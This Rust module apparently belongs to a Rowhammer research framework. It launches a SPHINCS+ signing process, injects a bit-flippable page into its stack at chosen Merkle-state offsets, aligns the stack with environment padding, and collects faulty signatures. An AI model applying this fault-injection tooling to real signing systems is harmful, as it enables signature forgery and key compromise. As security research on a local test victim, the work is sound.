use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, VictimResult};
use crate::{
    memory::{find_flippy_page, BitFlip, FlipDirection, PfnResolver, PhysAddr},
    util::{
        cancelable_thread::{spawn_cancelable, CancelableJoinHandle},
        PAGE_MASK, PAGE_SIZE,
    },
};
use anyhow::Context;
use libc::sched_getcpu;
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::fs;
use std::fs::OpenOptions;
use std::io;
use std::io::Write;
use std::mem::replace;
use std::process::Child;
use std::process::ChildStdout;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::{
    collections::HashMap,
    io::{BufRead, BufReader, Read},
    thread,
    time::{Duration, Instant},
};

#[derive(Serialize)]
enum State {
    Init {
        binary: String,
        env: Vec<(String, String)>,
        injection_config: InjectionConfig,
    },
    Running {
        target: String,
        #[serde(skip_serializing)]
        child: std::process::Child,
        #[serde(skip_serializing)]
        stderr_logger: Option<thread::JoinHandle<()>>,
        #[serde(skip_serializing)]
        checker: CancelableJoinHandle<()>,
        target_pfn: PhysAddr,
        injection_config: InjectionConfig,
    },
    Stopped,
}

#[derive(Serialize)]
pub struct SphincsPlus {
    state: State,
}

fn set_process_affinity(pid: libc::pid_t, core_id: usize) {
    use libc::{cpu_set_t, sched_setaffinity, CPU_SET, CPU_ZERO};

    unsafe {
        let mut cpuset: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);

        let result = sched_setaffinity(pid, std::mem::size_of::<cpu_set_t>(), &cpuset);
        if result != 0 {
            eprintln!(
                "Failed to set process affinity: {}",
                std::io::Error::last_os_error()
            );
        }
    }
}

fn get_current_core() -> usize {
    unsafe {
        let core_id = sched_getcpu();
        if core_id < 0 {
            panic!(
                "Failed to get current core: {}",
                std::io::Error::last_os_error()
            );
        } else {
            core_id as usize
        }
    }
}

#[derive(Debug, Serialize)]
pub struct StackProcessHammerResult {
    pipe_response: String,
    pub signatures: Vec<String>,
}

const KEYS_FILE: &str = "keys.txt";

// find profile entry with bitflips in needed range
#[derive(Clone, Debug, Serialize)]
pub struct TargetOffset {
    id: usize,
    description: &'static str,
    pub page_offset: usize,
    stack_offset: usize,
    pub target_size: usize,
    pub flip_direction: FlipDirection,
}

pub const TARGET_OFFSET_DUMMY: TargetOffset = TargetOffset {
    id: 0,
    description: "any",
    page_offset: 0,
    stack_offset: 29,
    target_size: 0x1000,
    flip_direction: FlipDirection::Any,
};

const SPX_N: usize = 32;

// CAUTION: STACK_BASE is 0x300 during FORS sign, 0x610 during XMSS sign
const STACK_BASE: usize = 0x610;
const STACK_OFFSET: usize = 32;

// Target offsets for shake-256s WITH memutils printing enabled
pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 10] = [
    // stack for h in 0..8
    TargetOffset {
        id: 0,
        description: "stack merkle layer 0 256s",
        page_offset: STACK_BASE,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::OneToZero,
    },
    TargetOffset {
        id: 1,
        description: "stack merkle layer 1 256s",
        page_offset: STACK_BASE + SPX_N,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::ZeroToOne,
    },
    TargetOffset {
        id: 2,
        description: "stack merkle layer 2 256s",
        page_offset: STACK_BASE + 2 * SPX_N,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::OneToZero,
    },
    TargetOffset {
        id: 3,
        description: "stack merkle layer 3 256s",
        page_offset: STACK_BASE + 3 * SPX_N,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::ZeroToOne,
    },
    TargetOffset {
        id: 4,
        description: "stack merkle layer 4 256s",
        page_offset: STACK_BASE + 4 * SPX_N,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::OneToZero,
    },
    TargetOffset {
        id: 5,
        description: "stack merkle layer 5 256s",
        page_offset: STACK_BASE + 5 * SPX_N,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::OneToZero,
    },
    TargetOffset {
        id: 6,
        description: "stack merkle layer 6 256s",
        page_offset: STACK_BASE + 6 * SPX_N,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::ZeroToOne,
    },
    TargetOffset {
        id: 7,
        description: "stack merkle layer 7 256s",
        page_offset: STACK_BASE + 7 * SPX_N,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::OneToZero,
    },
    TargetOffset {
        id: 8,
        description: "merkle leaf_addr",
        page_offset: 0x868,
        stack_offset: 32,
        target_size: 22,
        flip_direction: FlipDirection::ZeroToOne,
    },
    TargetOffset {
        id: 9,
        description: "merkle pk_addr",
        page_offset: 0x888,
        stack_offset: 32,
        target_size: 22,
        flip_direction: FlipDirection::ZeroToOne,
    },
];

impl SphincsPlus {
    /// Create a new `SphincsPlus` victim.
    pub fn new(binary: String, flip: BitFlip) -> anyhow::Result<Self> {
        let bait_count_after = HashMap::from([(32, 1), (31, 4), (30, 22), (29, 23)]); // TODO stabilize bait count after for stack inejction w/ env
        let (target, env) = if binary.eq("victims/stack-dummy/stack") {
            (TARGET_OFFSET_DUMMY.clone(), "".into())
        } else {
            let mut target = if flip.flip_direction() == FlipDirection::ZeroToOne {
                TARGET_OFFSETS_SHAKE_256S[9].clone()
            } else {
                TARGET_OFFSETS_SHAKE_256S[5].clone()
            };
            assert_eq!(flip.flip_direction(), target.flip_direction); // sanity check for our target selection, I'm becoming quite paranoid of
            let (env, page_overflow) = make_env_for(flip.addr, target.page_offset);
            if page_overflow {
                target.stack_offset -= 1;
            }
            (target, env)
        };
        let stack_offset = target.stack_offset;

        let bait_count_after = *bait_count_after
            .get(&stack_offset)
            .with_context(|| format!("unsupported stack offset {}", stack_offset))
            .unwrap();

        info!(
            "Using stack offset {} and bait count after {}",
            stack_offset, bait_count_after
        );

        let injection_config = InjectionConfig {
            id: target.id,
            target_addr: flip.addr,
            flippy_page_size: PAGE_SIZE,
            bait_count_after,
            bait_count_before: 0,
            stack_offset,
        };
        Ok(Self {
            state: State::Init {
                binary,
                injection_config,
                env: vec![(env, String::new())],
            },
        })
    }

    pub fn new_with_config(
        binary: String,
        injection_config: InjectionConfig,
        env: Vec<(String, String)>,
    ) -> anyhow::Result<Self> {
        Ok(Self {
            state: State::Init {
                binary,
                injection_config,
                env,
            },
        })
    }
}

fn make_env_for(flippy_addr: usize, target_offset: usize) -> (String, bool) {
    let flippy_offset = flippy_addr & PAGE_MASK;
    let target_offset = target_offset & PAGE_MASK;
    let overflow = target_offset < flippy_offset;
    let target_offset = if overflow {
        target_offset + PAGE_SIZE - 1
    } else {
        target_offset
    };
    let offset = target_offset - flippy_offset;
    info!(target: "env_fixer",
        "flippy_offset: 0x{:x}, target_offset: 0x{:x}, offset: 0x{:x}",
        flippy_offset, target_offset, offset
    );
    ("A".repeat(offset), overflow) // if target_offset < flippy_offset, we overflow a page boundary and have to subtract 1 from the region offset
}

impl HammerVictim for SphincsPlus {
    fn start(&mut self) -> Result<(), HammerVictimError> {
        match &self.state {
            State::Init {
                binary,
                injection_config,
                env,
            } => {
                set_process_affinity(unsafe { libc::getpid() }, get_current_core());
                let mut cmd = std::process::Command::new(binary);
                cmd.arg(KEYS_FILE);
                cmd.arg(injection_config.id.to_string());
                //cmd.arg(injection_config.target_addr.to_string());
                cmd.stdin(std::process::Stdio::piped());
                cmd.stdout(std::process::Stdio::piped());
                cmd.stderr(std::process::Stdio::piped());
                cmd.env_clear();
                cmd.envs(env.iter().cloned());
                let page_injector = PageInjector::new(*injection_config);
                let target_pfn = (injection_config.target_addr as *const libc::c_void)
                    .pfn()
                    .expect("PFN resolve failed");
                debug!("Victim command: {:?}", cmd);
                debug!(
                    "Injecting {:p} (phys {:p}) into victim process",
                    injection_config.target_addr as *const libc::c_void, target_pfn
                );
                let mut child = page_injector.inject(cmd).expect("Failed to inject page");
                info!("Victim launched");

                // Log victim stderr
                let stderr_logger = if let Some(stderr) = child.stderr.take() {
                    let reader = BufReader::new(stderr);

                    let binary = binary.clone();

                    // Spawn a thread to handle logging from stderr
                    let handle = thread::spawn(move || {
                        for line in reader.lines() {
                            match line {
                                Ok(log_line) => {
                                    info!(target: &binary, "{}", log_line);
                                }
                                Err(err) => {
                                    error!(target: &binary, "Error reading line from child process: {}", err)
                                }
                            }
                        }
                    });
                    Some(handle)
                } else {
                    eprintln!("Failed to capture stderr");
                    child.kill().expect("kill");
                    child.wait().expect("wait");
                    None
                };

                // Pin the child to the next core
                let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
                let target_core = (get_current_core() + 1) % num_cores as usize;
                let cid = child.id();
                info!("Pinning procees {} to core {}", cid, target_core);
                set_process_affinity(cid as libc::pid_t, target_core);

                let stdout = child.stdout.take().expect("stdout");
                let checker = spawn_cancelable(move |r| process_victim_signatures(stdout, r));

                self.state = State::Running {
                    target: binary.clone(),
                    child,
                    stderr_logger,
                    checker,
                    target_pfn,
                    injection_config: *injection_config,
                };

                // find flippy page
                thread::sleep(Duration::from_millis(100)); // wait before checking for flippy page, as victim might need some time to allocate the stack
                if let Err(e) = self.check_flippy_page_exists() {
                    Err(e)
                } else {
                    Ok(())
                }
            }
            _ => Err(HammerVictimError::NotRunning),
        }
    }
    #[cfg(feature = "sphincs_instrumentation")]
    fn init(&mut self) {
        match &mut self.state {
            State::Running { child, .. } => {
                // wait for "SIGUSR1" via victim stdout
                debug!("Waiting for SIGUSR1 msg from victim");
                let msg = child.read_line().expect("read_line");
                if msg != "SIGUSR1" {
                    panic!("Expected SIGUSR1, got '{msg}'");
                }
            }
            _ => panic!("Victim not running"),
        }
    }

    #[cfg(not(feature = "sphincs_instrumentation"))]
    fn init(&mut self) {
        match &mut self.state {
            State::Running { .. } => {
                // No-op for non-instrumented builds
            }
            _ => panic!("Victim not running"),
        }
    }

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        self.check_flippy_page_exists()?;
        match &self.state {
            State::Running { child, .. } => {
                #[cfg(feature = "sphincs_instrumentation")]
                {
                    thread::sleep(Duration::from_millis(1));
                    // resume the victim
                    debug!("Sending SIGUSR1 to victim");
                    unsafe {
                        libc::kill(child.id() as i32, libc::SIGUSR1);
                    }
                }
                let pstate = child.pstate().expect("pstate");
                if pstate != ProcState::Running {
                    return Err(HammerVictimError::NotRunning);
                }
            }
            _ => return Err(HammerVictimError::NotRunning),
        }
        Err(HammerVictimError::NoFlips)
    }

    fn stop(&mut self) {
        let state = replace(&mut self.state, State::Stopped);
        if let State::Running {
            mut child,
            mut stderr_logger,
            checker,
            ..
        } = state
        {
            child.kill().expect("kill");
            child.wait().expect("wait");
            if let Some(stderr_logger) = stderr_logger.take() {
                stderr_logger.join().expect("join");
            }
            checker.join().expect("join");
        }
    }
}

fn process_victim_signatures(mut stdout: ChildStdout, running: Arc<AtomicBool>) {
    std::fs::remove_file("sigs.txt").unwrap_or_else(|err| {
        error!("Failed to delete sigs.txt: {}", err);
    });
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("sigs.txt")
        .expect("Failed to open sigs.txt");
    loop {
        if !running.load(Ordering::Relaxed) {
            return;
        }
        debug!("Waiting for victim to send signature");
        let signature = stdout.read_line();
        match signature {
            Ok(signature) => {
                let expected_sha256 = [
                    "a2dc0903dbbf54dfaeec7475438864b8fa0b22f6fe9d0aa3d91faf5b323abde5", // sphincs+ sig
                    "dd4e6730520932767ec0a9e33fe19c4ce24399d6eba4ff62f13013c9ed30ef87", // dummy 4096 bytes of 0xaa (python3 -c "print('aa' * 4096, end='')" | shasum -a 256)
                    "12d0401ec5e681b3da36c7654381c418e671fb288fe320893f0efeb021df2582", // dummy 4096 bytes of 0x55 (python3 -c "print('55' * 2048, end='')" | shasum -a 256)
                    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // empty string
                ];
                let mut hasher = Sha256::new();
                hasher.update(signature.as_bytes());
                let result = hasher.finalize();
                let sig_sha256 = hex::encode(result);
                let flipped = !expected_sha256.contains(&sig_sha256.as_str());
                if flipped {
                    info!("Writting flippy signature {} to file...", sig_sha256);
                    // Write the signature to "sigs.txt"
                    writeln!(file, "{}", signature).expect("Failed to write to sigs.txt");
                }
            }
            Err(e) => match e.kind() {
                std::io::ErrorKind::UnexpectedEof => {
                    return;
                }
                std::io::ErrorKind::WouldBlock => {
                    error!("Would block");
                    continue;
                }
                _ => {
                    error!("Error reading line from child process: {}", e);
                    continue;
                }
            },
        }
    }
}

impl SphincsPlus {
    fn check_flippy_page_exists(&self) -> Result<(), HammerVictimError> {
        if let State::Running {
            child,
            target_pfn,
            injection_config,
            ..
        } = &self.state
        {
            let flippy_page = find_flippy_page(*target_pfn, child.id());
            match flippy_page {
                Ok(Some(flippy_page)) => {
                    info!("Flippy page found: {:?}", flippy_page);
                    if flippy_page.region_offset != injection_config.stack_offset {
                        warn!(
                            "Flippy page offset mismatch: {} != {}",
                            flippy_page.region_offset, injection_config.stack_offset
                        );
                        return Err(HammerVictimError::FlippyPageOffsetMismatch {
                            expected: injection_config.stack_offset,
                            actual: flippy_page,
                        });
                    }
                    return Ok(());
                }
                Ok(None) => {
                    return Err(HammerVictimError::FlippyPageNotFound);
                }
                Err(e) => return Err(HammerVictimError::PageMapError(e)),
            }
        }
        Err(HammerVictimError::NotRunning)
    }
}

trait ReadLine {
    fn read_line(&mut self) -> std::io::Result<String>;
}

impl ReadLine for std::process::ChildStdout {
    fn read_line(&mut self) -> std::io::Result<String> {
        let mut out = Vec::new();
        let mut buf = [0; 1];
        let mut last_recv = None;
        const READ_TIMEOUT: Duration = Duration::from_millis(1);
        loop {
            let nbytes = self.read(&mut buf)?;
            if nbytes == 0 && last_recv.is_none() {
                return Err(std::io::Error::from(std::io::ErrorKind::WouldBlock));
            }
            if nbytes == 0 && last_recv.is_some_and(|t: Instant| t.elapsed() > READ_TIMEOUT) {
                return Err(std::io::Error::from(std::io::ErrorKind::WouldBlock));
            }
            if nbytes == 0 {
                continue;
            }
            if buf[0] == b'\n' {
                break;
            }
            last_recv = Some(std::time::Instant::now());
            out.push(buf[0]);
        }
        let out = String::from_utf8(out).expect("utf8");
        Ok(out)
    }
}

/// Enum representing simplified process states.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ProcState {
    Running,
    Sleeping,
    DiskSleep,
    Zombie,
    Stopped,
    Traced,
    Dead,
    Unknown(char),
}

impl ProcState {
    fn from_stat_code(c: char) -> Self {
        match c {
            'R' => ProcState::Running,
            'S' => ProcState::Sleeping,
            'D' => ProcState::DiskSleep,
            'Z' => ProcState::Zombie,
            'T' => ProcState::Stopped,
            't' => ProcState::Traced,
            'X' | 'x' => ProcState::Dead,
            other => ProcState::Unknown(other),
        }
    }
}

/// Trait for querying the state of a process.
trait ProcessState {
    fn pstate(&self) -> io::Result<ProcState>;
}

impl ProcessState for Child {
    fn pstate(&self) -> io::Result<ProcState> {
        let pid = self.id();
        let stat_path = format!("/proc/{}/stat", pid);
        let contents = fs::read_to_string(stat_path)?;

        // According to proc(5), the state is the third field (after pid and comm)
        let start = contents
            .find(')')
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "Malformed stat file"))?;
        let rest = &contents[start + 2..]; // skip ") "
        let state_char = rest
            .split_whitespace()
            .next()
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "Empty stat fields"))?;

        Ok(ProcState::from_stat_code(
            state_char.chars().next().unwrap_or('?'),
        ))
    }
}

#[cfg(test)]
mod tests {
    use std::ptr::null_mut;

    use crate::{
        allocator::util::mmap,
        memory::BitFlip,
        util::PAGE_SIZE,
        victim::{
            sphincs_plus::{self},
            HammerVictim,
        },
    };

    #[test]
    fn test_sphincs_plus() -> anyhow::Result<()> {
        let ptr = mmap(null_mut(), PAGE_SIZE);
        let flip = BitFlip::new(ptr, 0x1, 0x1);
        let mut stack_process =
            super::SphincsPlus::new("/home/jb/sphincsplus/ref/test/server".to_string(), flip)?;
        for _ in 0..10 {
            stack_process.init();
            let resp = stack_process.check();
            assert!(
                matches!(resp, Err(sphincs_plus::HammerVictimError::NoFlips),),
                "{:?}",
                resp
            );
        }
        Ok(())
    }

    #[test]
    fn test_make_env_for() {
        let (env, overflow) = super::make_env_for(0x420, 0x630);
        assert_eq!(env.len(), 0x210, "target_offset > flippy_addr");
        assert!(!overflow, "target_offset > flippy_addr");
        let (env, overflow) = super::make_env_for(0x630, 0x420);
        assert_eq!(env.len(), 0xdef, "target_offset < flippy_addr");
        assert!(overflow, "target_offset < flippy_addr");
        let (env, overflow) = super::make_env_for(0x630, 0x630);
        assert_eq!(env.len(), 0, "target_offset == flippy_addr");
        assert!(!overflow, "target_offset == flippy_addr");
    }
}
